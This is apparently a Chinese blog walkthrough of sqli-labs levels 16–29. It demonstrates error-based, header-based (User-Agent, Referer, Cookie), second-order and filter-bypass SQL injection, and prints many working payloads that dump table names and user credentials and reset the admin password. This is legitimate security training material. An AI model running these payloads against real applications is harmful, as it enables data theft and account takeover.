> 右键->copy to file

保存到sqlmap的目录下

```sql
sqlmap -r "路径" --dbs
```

## Less-16

```cobol
1") or 1=1-- +
```

布尔注入

## Less-17 报错注入 主键重复

这题我们可以看到不一样的界面



<img src="https://i-blog.csdnimg.cn/blog_migrate/2de7e25884242c64fd513724b7f58362.png" alt="" style="max-height:94px; box-sizing:content-box;" />




发现是密码重置

说明我们是在密码重置的地方进行注入

那我们可以想一想

如果我们已经进入密码注入 那么我们是不是就已经进入了后台 因为

一般的都是需要你验证过了 才可以实现设置密码



<img src="https://i-blog.csdnimg.cn/blog_migrate/ffad0c803df6b941a8bad2efbfc84341.png" alt="" style="max-height:207px; box-sizing:content-box;" />


来试试看



<img src="https://i-blog.csdnimg.cn/blog_migrate/1b485e9850405a47db091e4e4a3195b3.png" alt="" style="max-height:182px; box-sizing:content-box;" />


发现报错了

但是这个位置 有点奇怪

```vbnet
1' and 1=1-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3dd0c5e16e59678d235232f3a9fa2ac6.png" alt="" style="max-height:206px; box-sizing:content-box;" />




通过这个我们能够确认了 1' 为闭合



<img src="https://i-blog.csdnimg.cn/blog_migrate/72d5fc77f65d4814f2d15d77fedbe8be.png" alt="" style="max-height:447px; box-sizing:content-box;" />


我们开始尝试

先看看能不能联合注入 看看能不能猜字段

```csharp
1' order by 1-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/39eaccf2a317096fa0461ea0f8f31cf6.png" alt="" style="max-height:65px; box-sizing:content-box;" />




发现不可以

我们看看能不能报错注入

```vbnet
1' and updatexml(1,0x7e,3)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4833a76b56328d5ec388fa8f364247ea.png" alt="" style="max-height:109px; box-sizing:content-box;" />


发现出现了  这里可以通过报错注入

那我们开始注入

### 这次使用另一个注入 主键重复

这个我觉得还是挺复杂的

#### 首先我们要知道rand()函数

rand()函数是在 0-1之间生成随机数



<img src="https://i-blog.csdnimg.cn/blog_migrate/87eb7702dec457c001f1ee58c71ec5fb.png" alt="" style="max-height:464px; box-sizing:content-box;" />


其中 如果给rand指定参数 例如rand(0) 那么他就会以这个种子（规律）去生成

其中 如果给定了值 生成的随机数就不会变

> rand(0)第一次的生成



<img src="https://i-blog.csdnimg.cn/blog_migrate/26cb5c72a9e01c31fcdfb3007f01c0c6.png" alt="" style="max-height:444px; box-sizing:content-box;" />


> rand(0)第二次生成



<img src="https://i-blog.csdnimg.cn/blog_migrate/bb137d7f6085c15d794acfd067a06eb1.png" alt="" style="max-height:444px; box-sizing:content-box;" />


发现没有任何的变化 所以其实就是固定生成这些

#### 了解完rand 我们开始了解一下 floor()

floor()其实没有什么特别的 就是向下取整

主要的用法只是对rand()进行变化

这里就要提出一个

```cobol
floor(rand(0)*2)
```

这个其实就是对rand的值进行计算



<img src="https://i-blog.csdnimg.cn/blog_migrate/28ae62b0c2481642720d90b464b738b3.png" alt="" style="max-height:484px; box-sizing:content-box;" />


得出来的其实就是0 1

#### 最后我们需要了解 group by 和 count(*)

count(*)就是进行计算出现了多少条

group by 就是通过什么分组

这两个在一起就会出现

```cobol
select count(*) from users group by password
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/0488b1a589bf68262789e682f1bef93d.png" alt="" style="max-height:347px; box-sizing:content-box;" />


因为我们的表中 password没有重复的值 所以都是1



<img src="https://i-blog.csdnimg.cn/blog_migrate/e860dd52dd60500afa5896a1489ffd60.png" alt="" style="max-height:338px; box-sizing:content-box;" />


#### 构造报错

这里就到主键重复报错了

首先我们先给出代码

```cobol
select COUNT(*) from users group BY floor(rand(0)*2)
```

然后来看看代码是怎么运行的

首先生成一个虚拟表

|  |  |
|:---:|:---:|



##### 第一次计算和第二次计算

计算得出为 0 但是其中并没有0 的主键 所以会在对floor进行执行

```undefined
这里相当于第一次执行是查值
 
第二次才是插入值
```

得到1 就把1 插入 然后count(*)+1

| 主键 | count(*) |
|:---:|:---:|
| 1 | 1 |



##### 第三次计算

首先通过group by 查值

发现是1 里面存在主键1 所以直接 count(*)+1即可



| 主键 | count(*) |
|:---:|:---:|
| 1 | 2 |



##### 第四次计算和第五次计算

先通过group by查值

发现是0 表中不存在

那么就需要再计算一次来插入

得到1 但是1在主键中已经存在了

#### 这里就会发生主键重复报错

#### 注意

这里序列应该是 0110

假如序列是0,1,0,0 或者 1,0,1,1 就不会形成报错 因为 会插入主键 0,1

### 做题

通过学习我们知道了 主键重复注入

#### 爆破数据库

```csharp
1' and (select count(*)from information_schema.tables group by concat(database(),floor(rand(0)*2)))-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a1814cc93804c428d8f69543637a7f62.png" alt="" style="max-height:92px; box-sizing:content-box;" />


得到数据库<span style="color:#0d0016;">security</span>

#### 爆破表名

```csharp
1' and (select count(*)from information_schema.tables group by concat((select group_concat(table_name)from information_schema.tables where table_schema='security'),floor(rand(0)*2)))-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/4279829a3553cd849be0a460f5dcdccd.png" alt="" style="max-height:156px; box-sizing:content-box;" />


得到了表<span style="color:#0d0016;">emails,referers,uagents,users</span>

#### 爆破字段名

```csharp
1' and (select count(*)from information_schema.columns where table_schema=database() group by concat((select group_concat(column_name)from information_schema.columns where table_name='users'and table_schema=database()),floor(rand(0)*2)))-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/02d09e71a0ee1b9812dae66e9a0cc41c.png" alt="" style="max-height:103px; box-sizing:content-box;" />


<span style="color:#0d0016;">得到字段名id,username,password1</span>

#### 爆破值

```csharp
1' and (select 1 from(select count(*),concat((select username from users limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x)a) -- +

```



这里的写法不一样

```cobol
1' and (select 1 from(select count(*),concat((select group_concat(username)from users),floor(rand(0)*2))x from information_schema.columns group by x)a)-- +


1' and (select 1 from(select count(*),concat(substr((select group_concat(password)from users),52,120),floor(rand(0)*2))x from information_schema.columns group by x)a)-- +
```

是通过别名来实现 这里后面可以深入了解一下

 [MYSQL报错注入的一点总结 - 先知社区ll](https://xz.aliyun.com/t/253#toc-0) 

我们通过这个写法来写一遍注入

```cobol
数据库名
1' and (select 1 from(select count(*),concat((select database()),floor(rand(0)*2))x from information_schema.tables group by x)a)-- +
表名
1' and (select 1 from(select count(*),concat((select group_concat(table_name)from information_schema.tables where table_schema=database()),floor(rand(0)*2))x from information_schema.tables group by x)a)-- +
字段名
1' and (select 1 from(select count(*),concat((select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database()),floor(rand(0)*2))x from information_schema.columns group by x)a)-- +

爆破值
1' and (select count(*),concat((select group_concat(username)from users),floor(rand(0)*2))x from information_schema.columns group by x limit 0,2)-- +
```

从这里看出 group by 的使用条件要很多 比如 需要至少3个数据等

正常报错注入使用前两个即可

### extractvalue()

```cobol
数据库
1' and extractvalue(1,concat(0x7e,(select database())))-- +
表名
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema='security')))-- +
字段
1' and extractvalue(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database())))-- +
值
1' and extractvalue(1,concat(0x7e,(select * from(select group_concat(id,username,password)from users)a)))-- +
```

#### 这里注意



<img src="https://i-blog.csdnimg.cn/blog_migrate/88373a0698fd8f3c98e86fa2b9d24119.png" alt="" style="max-height:130px; box-sizing:content-box;" />


在指定users表的时候 会报错 因为mysql不允许查询和更新语句在一起的时候 使用同一个表

所以这里通过



```cobol
(select * from(select group_concat(id,username,password)from users)a)
```

生成了一个新的a 虚拟表来查询 这样就不会报错了

## Less-18  UA注入

这里主要是写UA注入

我们先进行判断



<img src="https://i-blog.csdnimg.cn/blog_migrate/e52ea35fc82ea2a1e61eaad108d8bd4e.png" alt="" style="max-height:295px; box-sizing:content-box;" />


这里

出现了一个ip地址 然后又有一个登入注册框

我们可以看看

首先 我们先进行登入 **一定要登入成功！！** 

然后我们进行抓包 因为修改UA 要么用hackbar 要么就是bp最方便

我们不知道ua是什么语句 我们就随便输入一个' 看看

```sql
User-Agent: '
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/ea948bb44edd09e8f6e3c02a6184f8a5.png" alt="" style="max-height:335px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/257e528ca4b0cad6ad6bf8b7ae86baba.png" alt="" style="max-height:82px; box-sizing:content-box;" />


发现报错信息了

我们继续测试

```sql
User-Agent: '1'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9d6b13ca7eb0b7aff02afa6462c41682.png" alt="" style="max-height:138px; box-sizing:content-box;" />




发现报错了

我们就可以猜

```csharp
('ua','ip地址','用户')
```

差不多是这样 那我们只有 ua是可控的

我们就想想看怎么可以实现

```cobol
('' or updatexml(1,0x7e,3),0,1)-- +','ip地址','用户')

通过构造报错注入

这里就实现了('' or updatexml(1,0x7e,3),0,1) 这个语句

三个参数 1：'' or updatexml(1,0x7e,3)
2:0
3:1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d27a8911eb8973b996da07ef47d99b3e.png" alt="" style="max-height:127px; box-sizing:content-box;" />


然后就可以开始爆破了

```vbnet
' or updatexml(1,concat(0x7e,database()),3),0,1)-- +
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/d031b26e389d960a3da754d5fdf7af87.png" alt="" style="max-height:113px; box-sizing:content-box;" />


```haskell
' or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),3),0,1)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ce15f9bc974e8e3de892b39e79cf7acf.png" alt="" style="max-height:119px; box-sizing:content-box;" />




```bash
' or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users')),3),0,1)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3bf3f0d44dfcbe0039597680308a62fb.png" alt="" style="max-height:95px; box-sizing:content-box;" />


```vbnet
' or updatexml(1,concat(0x7e,(select concat(id,username,password)from security.users limit 0,1)),3),0,1)-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/0b22180e8e079dbe5290552344e45a94.png" alt="" style="max-height:105px; box-sizing:content-box;" />




这样就爆破完毕了

## Less-19  Referer

成功登入后



<img src="https://i-blog.csdnimg.cn/blog_migrate/bfffe59efd5c6f5fcc92d4a4b6655e4e.png" alt="" style="max-height:383px; box-sizing:content-box;" />


那这次是 Referer

```vbnet
Referer: ' or updatexml(1,0x7e,3),1)-- +
```

发现可以注入



<img src="https://i-blog.csdnimg.cn/blog_migrate/93a2da4229c8339c4d6b216a333edffb.png" alt="" style="max-height:128px; box-sizing:content-box;" />




## Less-20  Cookie

首先我们打开网站

通过测试发现登入界面无法注入

从后端代码也可以发现存在 一个checkinput



<img src="https://i-blog.csdnimg.cn/blog_migrate/0ed4290e77514d410dcfc117a237b692.png" alt="" style="max-height:470px; box-sizing:content-box;" />


所以我们先尝试登入后 看看有没有存在注入



<img src="https://i-blog.csdnimg.cn/blog_migrate/875f867240bcc0fe728b6652d82df60c.png" alt="" style="max-height:452px; box-sizing:content-box;" />


我们要测试哪里可能存在语句

所以bp抓包看看

经过测试 发现是在cookie上存在与数据库交互

```vbnet
Cookie: uname='
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e9bc5417d488e566f642b52247f41cdc.png" alt="" style="max-height:157px; box-sizing:content-box;" />




我们看看能不能直接使用报错注入 因为 他语句后面就是 limit 0,1没有其他参数



```vbnet
Cookie: uname=' and updatexml(1,0x7e,3)-- +
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/1329c89d83256f10dbe923644e832201.png" alt="" style="max-height:106px; box-sizing:content-box;" />


发现存在

我们就直接开始爆破即可

```cobol
' or updatexml(1,concat(0x7e,(select database())),3)-- +

' or updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database())),3)-- +
 
' or updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name='users' and table_schema=database())),3)-- +

' or updatexml(1,concat(0x7e,(select concat(username,password)from security.users limit 0,1)),3)-- +
```

我们看看源代码

```php
$sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
```

## Less-21

这道题一样的

登入后进行抓包



<img src="https://i-blog.csdnimg.cn/blog_migrate/ce55ceef1780459d0685194637a048a5.png" alt="" style="max-height:88px; box-sizing:content-box;" />


在cookie中发现了base64加密

我们看看上传base64的加密后的闭合看看





<img src="https://i-blog.csdnimg.cn/blog_migrate/1fb9a810e165abe70eb784fedfda0018.png" alt="" style="max-height:582px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/2a07c2215e5859adcaa804a209af201b.png" alt="" style="max-height:90px; box-sizing:content-box;" />


发现了报错 是 ')类型的

我们直接加上 然后看看报错注入可不可以



<img src="https://i-blog.csdnimg.cn/blog_migrate/04ac74b3355f07b9012d53bc79141811.png" alt="" style="max-height:1000px; box-sizing:content-box;" />




然后进行注入即可

## Less-22

和21一样 只不过 闭合是双引号闭合



<img src="https://i-blog.csdnimg.cn/blog_migrate/e2ee2e2da8f619fc9530ab231a0a2089.png" alt="" style="max-height:591px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/58fd7415529657e80ffd406da60eebde.png" alt="" style="max-height:1000px; box-sizing:content-box;" />




## Less-23 过滤 注释符

从这里就开始过滤了

我们先fuzz一下看看

通过fuzz 我们能发现 是单引号闭合

```cobol
?id=1' or 1=2-- +
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/dd3200393e56fdf1464207531657af2c.png" alt="" style="max-height:126px; box-sizing:content-box;" />


但是这个报错信息有问题 因为我们使用 -- + 进行注释 后面的  但是会返回 limit

说明有可能被过滤了

我们看看其他注释

#

发现是一样的

因为我们知道了是单引号闭合

我们来判断

```cobol
1' and '1'='1
1' and '1'='2
```

发现确定了 我们开始看看union注入可不可以

这里无法使用 order by 来判断字段 所以只能使用 select 一个一个猜



<img src="https://i-blog.csdnimg.cn/blog_migrate/377250660fc1f9f19cfcf664f8e7b2e4.png" alt="" style="max-height:425px; box-sizing:content-box;" />






<img src="https://i-blog.csdnimg.cn/blog_migrate/919245d7ae55fd6baa1e49e0018ff335.png" alt="" style="max-height:284px; box-sizing:content-box;" />




这里就可以判断出 是3个字节 回显了正确的值

### 查看注入点

```cobol
/?id=-1' union select 1,2,'2
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a224ea09064de09c5b334f3cb9bb90f3.png" alt="" style="max-height:140px; box-sizing:content-box;" />


爆破数据库



<img src="https://i-blog.csdnimg.cn/blog_migrate/d1cf00790bf0b60fd6400a41f9d513fc.png" alt="" style="max-height:198px; box-sizing:content-box;" />


之后就是正常的联合注入了

## Less-24  二次注入

该注入 并不是我们执行查询来实现爆破数据库

而是通过 设计者的逻辑缺陷来 实现获得管理员账号

首先我们收集一下信息

存在哪页面可以让我们进行测试注入

### 1首页(登入界面)



<img src="https://i-blog.csdnimg.cn/blog_migrate/ad553d9c471bb692e76ccf75b42853d1.png" alt="" style="max-height:539px; box-sizing:content-box;" />


### 2创建新用户界面



<img src="https://i-blog.csdnimg.cn/blog_migrate/02f564ae75d4f5a0d803fd6b147e30eb.png" alt="" style="max-height:473px; box-sizing:content-box;" />


### 3登入成功界面（修改密码）



<img src="https://i-blog.csdnimg.cn/blog_migrate/c3ad28940e620b2447ef79dd6eacbc81.png" alt="" style="max-height:543px; box-sizing:content-box;" />


该二次注入 就是在测试

所以注入其实还是靠猜

首先我们看看能不能对两个不登入界面进行测试



<img src="https://i-blog.csdnimg.cn/blog_migrate/55cb4ae1fd8232e4557e15a329340af6.png" alt="" style="max-height:359px; box-sizing:content-box;" />


发现1 无法注入 存在过滤

2也无法注入 就是创建一个用户而已

我们这个时候想一想

如果他只是通过转义呢

### 解释

\' ----->'

如果只是进行转义 那我们 假如输入 admin'

他就会变为 admin \' 这样我们就无法实现注入  会被当做字符

但是存入数据库的却还是 admin'

这里就是设计的缺陷地方

如果我们输入 admin ' #或者 admin ' -- +

那么会被过滤 但是存入数据库的还是 admin' # 和 admin ' -- +

#### 测试



<img src="https://i-blog.csdnimg.cn/blog_migrate/306afa3360ac183f394143c89d9d75ac.png" alt="" style="max-height:98px; box-sizing:content-box;" />


这里发现 我们输入的恶意语句 直接作为字符串存入了数据库

那我们看看能不能登入



<img src="https://i-blog.csdnimg.cn/blog_migrate/b13c1670fbebcf5dffafbcd38bcda7cc.png" alt="" style="max-height:768px; box-sizing:content-box;" />




成功登入

这里是一个修改密码的语句

那我们思考一下

数据库中已经指定了我们的账号  admin'#

那在数据库中一般是如何指定呢

```cobol
username='用户名'
```

那我们恶意的字符串呢

```csharp
username='admin'#'
```

那这里 不就实现了我们的注入 因为会注释掉后面的' 所以这个时候会修改admin的账号

那我们不就可以通过admin登入管理员界面了

#### 测试



<img src="https://i-blog.csdnimg.cn/blog_migrate/a66ba585b28c660ba742cf359224682b.png" alt="" style="max-height:177px; box-sizing:content-box;" />


修改成功



<img src="https://i-blog.csdnimg.cn/blog_migrate/c8e3dbcd983fc7a2f3296829faaff105.png" alt="" style="max-height:122px; box-sizing:content-box;" />


发现admin被修改了

我们看看能不能登入



<img src="https://i-blog.csdnimg.cn/blog_migrate/bcf468af73425b4221639d984d66c9f3.png" alt="" style="max-height:404px; box-sizing:content-box;" />


发现成功登入了

这个就是二次注入简单应用

### 接下来我们看看源代码

#### 登入界面

##### index.php



<img src="https://i-blog.csdnimg.cn/blog_migrate/0af4f6defd8b982c910302d576b6772f.png" alt="" style="max-height:50px; box-sizing:content-box;" />


传给login.php

##### login.php

转义



<img src="https://i-blog.csdnimg.cn/blog_migrate/1cf3554807c72366b99a899e3d29b13d.png" alt="" style="max-height:396px; box-sizing:content-box;" />


我们来看看这个函数是干嘛用的

###### mysql_real_escape_string()函数

是对字符串进行转义的

假如我们输入 admin'

他就会自动 admin\'

然后就会实现转义

```swift
对
单引号'
双引号"
反斜杠\
Null字符 \0
```

这些进行转义

所以在这里我们无法通过 ' 闭合来实现sql注入

#### 注册界面

##### new_user.php

输入的内容转到 login_create.php处理



<img src="https://i-blog.csdnimg.cn/blog_migrate/f685ee62b7dfd57ead2be0d736d15d70.png" alt="" style="max-height:105px; box-sizing:content-box;" />




##### login_create.php

过滤



<img src="https://i-blog.csdnimg.cn/blog_migrate/8b0687fde7c13d5d879354e10b126fe7.png" alt="" style="max-height:154px; box-sizing:content-box;" />


插入



<img src="https://i-blog.csdnimg.cn/blog_migrate/16b57715defdff5d98876e3712ac8f0b.png" alt="" style="max-height:159px; box-sizing:content-box;" />


这里就是直接把我们污染的用户名插入数据库

#### 修改密码界面

##### logged_in.php



<img src="https://i-blog.csdnimg.cn/blog_migrate/b7b8b395aef48df822ea997c41e66ffe.png" alt="" style="max-height:95px; box-sizing:content-box;" />


##### pass_change.php

过滤





<img src="https://i-blog.csdnimg.cn/blog_migrate/1067339e0a1b77f2c347b65ce34128ff.png" alt="" style="max-height:140px; box-sizing:content-box;" />


更新语句



<img src="https://i-blog.csdnimg.cn/blog_migrate/bf494dd1b79797b41dbb6a0e25724c5b.png" alt="" style="max-height:152px; box-sizing:content-box;" />


如果两个密码相同 就更新

这里就是注入的地方

```sql
UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass' ";

这样修改的就是admin的密码了 这样就得到了管理员的账号
```

二次注入就到此结束

## Less-25  or和and的过滤



<img src="https://i-blog.csdnimg.cn/blog_migrate/2ed822750c4eeb4e7c3e146f0c5f58bb.png" alt="" style="max-height:282px; box-sizing:content-box;" />


提示了or and  可能过滤了这两个

我们看看 能不能通过逻辑判断来判断注入点



<img src="https://i-blog.csdnimg.cn/blog_migrate/1442b79ca3ee6a912858fa3b6a25d7a6.png" alt="" style="max-height:215px; box-sizing:content-box;" />


在提示中发现 确实过滤了and

这里我们可以看看有几种绕过的方式

### 双写绕过

```sql
or----> oorr
 
and----> anandd
```

这种过滤的原理就是 他匹配到了 or 和 and 并且过滤了 但是过滤完会重新组合为 or 和 and



<img src="https://i-blog.csdnimg.cn/blog_migrate/e06c3c1f0da63cf865b52a650cd61193.png" alt="" style="max-height:178px; box-sizing:content-box;" />


### or用|| and使用 &&

这里and无法使用 && 但是 or可以使用 ||

```cobol
?id=-1' || 1=1-- +
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/b37063fc2d79b7e803410991ef876fd8.png" alt="" style="max-height:221px; box-sizing:content-box;" />


### 添加注释

/*or*/



<img src="https://i-blog.csdnimg.cn/blog_migrate/72a817899a15c8cc1d8dc21b3fc3d3b8.png" alt="" style="max-height:214px; box-sizing:content-box;" />


发现不行

### 大小写变形

Or oR

aND And



<img src="https://i-blog.csdnimg.cn/blog_migrate/499003ee2c1dbf4ce876ac76082f9167.png" alt="" style="max-height:241px; box-sizing:content-box;" />


不行

### 编码

hex

url

但是都不行

## Less-25a



<img src="https://i-blog.csdnimg.cn/blog_migrate/13f61328aaccf7d4555cf50a4a1367ae.png" alt="" style="max-height:530px; box-sizing:content-box;" />


还是 or 和  and   通过判断是整数型

```cobol
?id=(2-1)
```

通过这个判断即可

然后继续注入即可

## Less-26  空格、union和select的过滤



<img src="https://i-blog.csdnimg.cn/blog_migrate/0ae0ff22742923c5e6c6dff7f9a982a7.png" alt="" style="max-height:636px; box-sizing:content-box;" />


过滤了空格和一些命令

我们试试看

绕过空格

我们可以使用()来实现

```cobol
这道题我的环境中只可以使用报错注入 无法绕过空格过滤
?id=1'||(extractvalue(1,0x7e))||'1
 
?id=1'||(updatexml(1,0x7e,3))||'1
 
group by 的无法使用
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d63d9542275cc674d2657614d37c2f29.png" alt="" style="max-height:186px; box-sizing:content-box;" />


```cobol
?id=1'||(extractvalue(1,concat(0x7e,(database()))))||'1
 
 
?id=1'||(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())))))||'1
 
 
 
 
?id=1'||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())anandd(table_name='users')))))||'1
 
 
?id=1'||(extractvalue(1,concat(0x7e,(substr((select(group_concat(username,passwoorrd))from(users)),25,40)))))|'1
```

但是看网络的wp

空格可以使用 %0a  %a0 %0b绕过

## Less-26a   判断闭合

这道题是')闭合

首先我们来学习一下如何判断')闭合

```cobol
select * from user where id=('id')
 
 
输入 2'||'1'='2
select * from user where id=('2'||'1'='2')
这个 通过逻辑判断 返回的是 bool 为1 所以会查询id=1
 
如果不是括号闭合
select * from user where id='2'||'1'='2'
 
这里就只会查询 id=2的值 所以查看回显就可以  如果回显的是1的页面 就说明是括号
 
如果回显的是2的页面 就说明是括号闭合
```

然后就和26一样进行注入即可

## Less-27 过滤 union select

这里很明显就是过滤了union 和 select



<img src="https://i-blog.csdnimg.cn/blog_migrate/0d9479bc5f9367b073ca0ada9570a145.png" alt="" style="max-height:421px; box-sizing:content-box;" />


但是把 or  and 放出来了

并且这道题 使用 %0a就可以绕过空格

我们直接开始判断闭合

```cobol
2'and%0a'1'='1
 
 
2'and%0a'1'='2
```

说明我们得到了闭合

我们直接开始看看能不能执行order by但是这里注意

我们使用order by 是直接通过列举

因为 后面存在 一个 ' 所以我们需要把他完成闭合 不然会报错

```cobol
?id=2'order%0Aby%0A1,2,3,4,'5
```

这个其实也是排列 按照 1,2,3列进行排列  并且通过字母排列



<img src="https://i-blog.csdnimg.cn/blog_migrate/9ba7d4163f0f03e1d6c4ad6c8d89127f.png" alt="" style="max-height:125px; box-sizing:content-box;" />




得到3个字段

直接脱库看看

通过大小写和双写绕过过滤

```cobol
?id=0'unUNIONion%0ASELSELECTECT%0a1,2,'3
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ff2acec73e3974bd6bee4e7d40032531.png" alt="" style="max-height:303px; box-sizing:content-box;" />


直接爆破

我们选择 2 的位置爆破 但是这里要注意 因为2 在 中间字段

所以正确写法应该是

```cobol
union select 1,group_concat(table_name),3 from information_schemat.tables where table_schema=database()
```

别忘记3 要在 指定表的前面

```cobol
0'unUNIONion%0ASELSELECTECT%0A1,database(),'3
 
 
 
表名
0'%0AuniUNIONon%0ASELSELECTECT%0A1,group_concat(table_name),3%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema='security'and'1
 
0'%0AuniUNIONon%0ASELSELECTECT%0A1,group_concat(table_name),3%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema='security
 
上面两个都可以
 
 
然后就是正常的注入了
0'%0AuniUNIONon%0ASELSELECTECT%0A1,group_concat(column_name),3%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema='security'%0Aand%0Atable_name='users'and'1
 
 
最后爆破库
?id=0'%0AuniUNIONon%0ASELSELECTECT%0A1,group_concat(id,username,password),3%0Afrom%0Asecurity.users%0Awhere%0Aid=1%0Aand'1
 
 
简化是
 
group_concat(id,username,password)from security.users where id=1 and '1

如果不加 id 后面 and报错 因为只能在where后面

```

## 





<img src="https://i-blog.csdnimg.cn/blog_migrate/0cda85f7075695af5d4c5faa8374d507.png" alt="" style="max-height:107px; box-sizing:content-box;" />




## Less-27a

```bash
1'%0Aand%0A'1'='2
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/d7e58fcc4ccd3aa2cda1d37e3859c557.png" alt="" style="max-height:135px; box-sizing:content-box;" />


```bash
2'%0Aand%0A'1'='2
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/87aa904101f76ae35bc8c83d82e6bfa8.png" alt="" style="max-height:190px; box-sizing:content-box;" />


两个假语句都正常返回 说明是字符型 只读取第一个字符

我们看看双引号

```bash
2"%0Aand"1"="2
2"%0Aand"1"="1
```

确定了是

但是这道题目没有报错信息

无法使用报错注入

联合注入即可

```bash
?id= 0"%0AuniUNIONon%0ASELSELECTECT%0A1,database(),3%0Aand"1
 
表名
 
?id= 0"%0AuniUNIONon%0ASELSELECTECT%0A1,group_concat(table_name),3%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database()%0Aand"1
 
字段
?id=0"%0AuniUNIONon%0ASELSELECTECT%0A1,group_concat(column_name),3%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=database()%0Aand%0Atable_name='users'%0Aand"1
 
值
?id=0"%0AuniUNIONon%0ASELSELECTECT%0A1,group_concat(id,username,password),3%0Afrom%0Ausers%0Awhere%0Aid=1%0Aand"1
```

## Less-28   过滤union空格select组合

这道题不过滤 union select

只过滤这个组合 union空格select

我们尝试绕过

```bash
uniunion%0aselecton%0aselect
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b72af8022c0fc7743974fec1c76a3512.png" alt="" style="max-height:153px; box-sizing:content-box;" />




这个就绕过了这个组合的过

我们来具体回顾一下闭合方式

```bash
输入 
1' 报错 
1" 没有报错

猜测是' 类型
但是存在两个情况
SELECT * FROM users WHERE id='1'and '0' LIMIT 0,1
 
SELECT * FROM users WHERE id=('1'and '0') LIMIT 0,1
 
两个情况都可以顺利闭合 
所以我们首先判断第二个 因为如果没有括号 第一个会报错
 
输入1') and ('1'='1
 
变化就是 1')%0aand%0a('1'='1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a7c224025ada3e225887518f30e829e8.png" alt="" style="max-height:235px; box-sizing:content-box;" />


发现没有报错 那说明就是括号的闭合

')类型

我们可以开始注入了

```bash
0')%0Aununion%0Aselection%0Aselect%0A1,database(),3%0Aand%0A('1
 
 
表
0')%0Aununion%0Aselection%0Aselect%0A1,group_concat(table_name),3%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database()%0Aand%0A('1
 
字段
0')%0Aununion%0Aselection%0Aselect%0A1,group_concat(column_name),3%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=database()%0Aand%0Atable_name='users'%0Aand%0A('1
 
值
0')%0Aununion%0Aselection%0Aselect%0A1,group_concat(id,username,password),3%0Afrom%0Ausers%0Awhere%0aid=1%0aand%0A('1
```

## Less-28a

这道题和28一样 并且过滤更少

只过滤了组合 直接注入即可

## Less-29  参数污染

### http存在参数污染

其中具体点就是 用户可以通过 GET/POST请求上传多个参数

至于要取哪个参数 就是看 服务器的配置



<img src="https://i-blog.csdnimg.cn/blog_migrate/f50b85c770a968a7bb33c466d768c764.png" alt="" style="max-height:623px; box-sizing:content-box;" />


这里我使用的是 php+apache

所以读取的是最后一个的参数

我们首先测试一下基本的注入是否可以实现



<img src="https://i-blog.csdnimg.cn/blog_migrate/47e4d1d612b32df318a98f5286af43e7.png" alt="" style="max-height:806px; box-sizing:content-box;" />


他会直接过滤 ' 我们看看源代码



<img src="https://i-blog.csdnimg.cn/blog_migrate/3e57967f52b913f397ca39d269ccde1b.png" alt="" style="max-height:274px; box-sizing:content-box;" />


通过正则 匹配一个或者多个数字

如果有除了数字的值 就直接跳转到hacked.php



<img src="https://i-blog.csdnimg.cn/blog_migrate/d902cac3233da8a63ccca242a5fb93a6.png" alt="" style="max-height:458px; box-sizing:content-box;" />


这里就是关于参数的过滤

```cobol
通过 &来分割
 
然后都作为 key=value类型
 
从0开始匹配两个字符
 
如果前两个字符是id
 
那么就读取 3-30个字符
 
 
 
```

这里主要看出来 只匹配了前两个字符 对前两个字符进行匹配

没有对第二个参数进行过滤

而我们是php+apach 就只匹配最后一个参数

所以我们可以在最后一个参数中进行注入

```cobol
?id=1&id=1'
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ec022f49f6c53108e9d6f92130e04dc4.png" alt="" style="max-height:214px; box-sizing:content-box;" />




这里我们就绕过了waf

我们来看看代码的运行

我们写入两个参数

id=1&id=1'

```puppet
 
